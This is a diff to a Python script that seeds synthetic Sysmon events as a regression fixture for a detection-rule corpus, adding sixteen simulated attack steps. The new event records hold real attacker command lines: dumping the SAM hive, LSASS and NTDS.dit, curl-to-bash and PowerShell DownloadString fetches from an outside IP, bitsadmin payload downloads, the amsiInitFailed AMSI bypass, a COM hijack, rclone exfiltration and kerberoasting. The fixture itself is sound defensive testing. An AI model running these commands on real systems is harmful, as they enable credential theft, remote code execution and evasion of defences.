@@ -2,7 +2,7 @@
 """Seed one incident that exercises every rule in the corpus.
 
 seed_apt.py tells one attacker's story end to end. This script has a different
-job: it is a regression fixture and a coverage demo, built to fire all 64 rules
+job: it is a regression fixture and a coverage demo, built to fire all 80 rules
 -- across every EventID the engine understands (1, 3, 6, 7, 8, 10, 11, 12, 13,
 17, 20) plus a handful of EventIDs no rule keys on (18, 19, 21, 22, 23) added
 purely so the incident's raw event stream and process tree show the full
@@ -39,14 +39,22 @@ machine. The phases, roughly in kill-chain order:
                   ├─ wmic.exe registering a WMI event consumer
                   ├─ ransomware.exe: shadow-copy deletion, a ransom note, and
                   │   several .locked files
-                  └─ coverage-expansion pass: schtasks /create, a service
-                      pointed at a staged binary, a remote thread into LSASS,
-                      a firewall allow rule, wevtutil cl, a passworded rar
-                      archive, InstallUtil against a staged DLL, a remote
-                      mshta HTA, hh.exe against a staged .chm, a remote MSI,
-                      a net.exe admin-group add, sc stopping WinDefend,
-                      sdelete, cipher /w, and RDP enabled via registry
-                      (SYS-093 through SYS-107)
+                  ├─ coverage-expansion pass 1: schtasks /create, a service
+                  │   pointed at a staged binary, a remote thread into LSASS,
+                  │   a firewall allow rule, wevtutil cl, a passworded rar
+                  │   archive, InstallUtil against a staged DLL, a remote
+                  │   mshta HTA, hh.exe against a staged .chm, a remote MSI,
+                  │   a net.exe admin-group add, sc stopping WinDefend,
+                  │   sdelete, cipher /w, and RDP enabled via registry
+                  │   (SYS-093 through SYS-107)
+                  └─ coverage-expansion pass 2: reg.exe saving the SAM hive,
+                      procdump against lsass, ntdsutil NTDS.dit extraction,
+                      mavinject injection, wsl -e, MSBuild against a staged
+                      project, forfiles against a staged target, a tscon
+                      session hijack, SharpHound, rclone, Rubeus, a
+                      PowerShell v2 downgrade, an AMSI-bypass command line,
+                      bitsadmin /transfer, a COM CLSID hijack, and a
+                      token-theft tool keyword (SYS-108 through SYS-123)
               └─ ftp.exe -s:script -> cmd.exe               (SYS-079)
       ├─ wmiprvse.exe          remote WMI/DCOM persistence   (SYS-078)
       ├─ PSEXESVC.exe          lateral movement arrival      (SYS-072, SYS-073)
@@ -72,7 +80,7 @@ HOST = "WKSTN-RANGE-01"
 USER = "CORP\\redteam.ops"
 BASE = datetime.now(timezone.utc) - timedelta(minutes=15)
 
-# All 64 rule IDs the corpus ships today, so main() can report exactly what
+# All 80 rule IDs the corpus ships today, so main() can report exactly what
 # (if anything) did not fire.
 EXPECTED_RULES = {
     "SYS-001", "SYS-002", "SYS-003", "SYS-004", "SYS-005", "SYS-006", "SYS-007",
@@ -84,7 +92,9 @@ EXPECTED_RULES = {
     "SYS-086", "SYS-087", "SYS-088", "SYS-089", "SYS-090", "SYS-091", "SYS-092",
     "SYS-093", "SYS-094", "SYS-095", "SYS-096", "SYS-097", "SYS-098", "SYS-099",
     "SYS-100", "SYS-101", "SYS-102", "SYS-103", "SYS-104", "SYS-105", "SYS-106",
-    "SYS-107",
+    "SYS-107", "SYS-108", "SYS-109", "SYS-110", "SYS-111", "SYS-112", "SYS-113",
+    "SYS-114", "SYS-115", "SYS-116", "SYS-117", "SYS-118", "SYS-119", "SYS-120",
+    "SYS-121", "SYS-122", "SYS-123",
 }
 
 
@@ -208,6 +218,23 @@ G = {
     "sdelete": "{rng-sdelete}",
     "cipher_wipe": "{rng-cipher-wipe}",
     "reg_rdp": "{rng-reg-rdp}",
+    # Coverage-expansion pass 2 (SYS-108 through SYS-123).
+    "reg_hive_dump": "{rng-reg-hive-dump}",
+    "procdump": "{rng-procdump}",
+    "ntdsutil": "{rng-ntdsutil}",
+    "mavinject": "{rng-mavinject}",
+    "wsl": "{rng-wsl}",
+    "msbuild": "{rng-msbuild}",
+    "forfiles": "{rng-forfiles}",
+    "tscon": "{rng-tscon}",
+    "sharphound": "{rng-sharphound}",
+    "rclone": "{rng-rclone}",
+    "rubeus": "{rng-rubeus}",
+    "ps_downgrade": "{rng-ps-downgrade}",
+    "ps_amsi": "{rng-ps-amsi}",
+    "bitsadmin": "{rng-bitsadmin}",
+    "com_hijack": "{rng-com-hijack}",
+    "juicypotato": "{rng-juicypotato}",
 }
 
 
@@ -542,6 +569,86 @@ def events() -> list[dict]:
     ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\reg.exe", ProcessGuid=G["reg_rdp"],
                          TargetObject=r"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\fDenyTSConnections",
                          Details="DWORD (0x00000000)"))
+
+    # === Coverage-expansion pass 2: SYS-108 through SYS-123, off "ops" ===
+    ev.append(proc(step(1), G["reg_hive_dump"], G["ops"], r"C:\Windows\System32\reg.exe",
+                    r"reg.exe save HKLM\SAM C:\Users\redteam.ops\AppData\Local\Temp\sam.hive",
+                    pid=5240, ppid=4510, integrity="High"))
+
+    ev.append(proc(step(1), G["procdump"], G["ops"], r"C:\Users\redteam.ops\AppData\Local\Temp\procdump64.exe",
+                    r"procdump64.exe -ma lsass.exe C:\Users\redteam.ops\AppData\Local\Temp\lsass3.dmp",
+                    pid=5250, ppid=4510, integrity="High"))
+
+    ev.append(proc(step(1), G["ntdsutil"], G["ops"], r"C:\Windows\System32\ntdsutil.exe",
+                    r'ntdsutil.exe "ac i ntds" "ifm" "create full C:\Users\redteam.ops\AppData\Local\Temp\ntds" q q',
+                    pid=5260, ppid=4510, integrity="High"))
+
+    ev.append(proc(step(1), G["mavinject"], G["ops"], r"C:\Windows\System32\mavinject.exe",
+                    r"mavinject.exe 4930 /INJECTRUNNING C:\Users\redteam.ops\AppData\Local\Temp\evil.dll",
+                    pid=5270, ppid=4510))
+
+    ev.append(proc(step(1), G["wsl"], G["ops"], r"C:\Windows\System32\wsl.exe",
+                    r'wsl.exe -e /bin/bash -c "curl http://45.132.192.68/stage7.sh | bash"',
+                    pid=5280, ppid=4510))
+
+    ev.append(proc(step(1), G["msbuild"], G["ops"],
+                    r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe",
+                    r"MSBuild.exe C:\Users\redteam.ops\AppData\Local\Temp\evil.csproj",
+                    pid=5290, ppid=4510))
+
+    ev.append(proc(step(1), G["forfiles"], G["ops"], r"C:\Windows\System32\forfiles.exe",
+                    r"forfiles.exe /p C:\Users\redteam.ops\AppData\Local\Temp /m stage8.exe /c stage8.exe",
+                    pid=5300, ppid=4510))
+
+    ev.append(proc(step(1), G["tscon"], G["ops"], r"C:\Windows\System32\tscon.exe",
+                    "tscon.exe 3 /dest:rdp-tcp#1", pid=5310, ppid=4510, integrity="High"))
+
+    ev.append(proc(step(1), G["sharphound"], G["ops"], r"C:\Users\redteam.ops\AppData\Local\Temp\SharpHound.exe",
+                    "SharpHound.exe -c All --zipfilename loot.zip", pid=5320, ppid=4510))
+
+    ev.append(proc(step(1), G["rclone"], G["ops"], r"C:\Users\redteam.ops\AppData\Local\Temp\rclone.exe",
+                    r"rclone.exe copy C:\Users\redteam.ops\Documents remote:backup --config C:\Users\redteam.ops\AppData\Local\Temp\rclone.conf",
+                    pid=5330, ppid=4510))
+
+    ev.append(proc(step(1), G["rubeus"], G["ops"], r"C:\Users\redteam.ops\AppData\Local\Temp\Rubeus.exe",
+                    "Rubeus.exe kerberoast /outfile:C:\\Users\\redteam.ops\\AppData\\Local\\Temp\\hashes.txt",
+                    pid=5340, ppid=4510))
+
+    ev.append(proc(step(1), G["ps_downgrade"], G["ops"],
+                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                    r"powershell -version 2 -nop -w hidden -c \"IEX (New-Object Net.WebClient)."
+                    r"DownloadString('http://45.132.192.68/legacy.ps1')\"",
+                    pid=5350, ppid=4510))
+
+    ev.append(proc(step(1), G["ps_amsi"], G["ops"],
+                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                    r"powershell -nop -w hidden -c \"[Ref].Assembly.GetType("
+                    r"'System.Management.Automation.AmsiUtils').GetField('amsiInitFailed',"
+                    r"'NonPublic,Static').SetValue($null,$true)\"",
+                    pid=5360, ppid=4510))
+
+    ev.append(proc(step(1), G["bitsadmin"], G["ops"], r"C:\Windows\System32\bitsadmin.exe",
+                    r"bitsadmin.exe /transfer myjob http://45.132.192.68/stage9.exe "
+                    r"C:\Users\redteam.ops\AppData\Local\Temp\stage9.exe",
+                    pid=5370, ppid=4510))
+
+    ev.append(proc(step(1), G["com_hijack"], G["ops"],
+                    r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                    r"powershell -nop -c \"New-Item -Path "
+                    r"'HKCU:\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32' "
+                    r"-Force; Set-ItemProperty -Path "
+                    r"'HKCU:\Software\Classes\CLSID\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32' "
+                    r"-Name '(default)' -Value 'C:\Users\redteam.ops\AppData\Local\Temp\evil.dll'\"",
+                    pid=5380, ppid=4510))
+    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                         ProcessGuid=G["com_hijack"],
+                         TargetObject=r"HKU\S-1-5-21-1-2-3-1001\Software\Classes\CLSID"
+                         r"\{42aedc87-2188-41fd-b9a3-0c966feabec1}\InprocServer32\(Default)",
+                         Details=r"C:\Users\redteam.ops\AppData\Local\Temp\evil.dll"))
+
+    ev.append(proc(step(1), G["juicypotato"], G["ops"], r"C:\Users\redteam.ops\AppData\Local\Temp\JuicyPotato.exe",
+                    "JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -t *",
+                    pid=5390, ppid=4510, integrity="High"))
 
     # === FTP LOLBAS execution, off "ops" ===
     ev.append(proc(step(2), G["ftp"], G["ops"], r"C:\Windows\System32\ftp.exe",
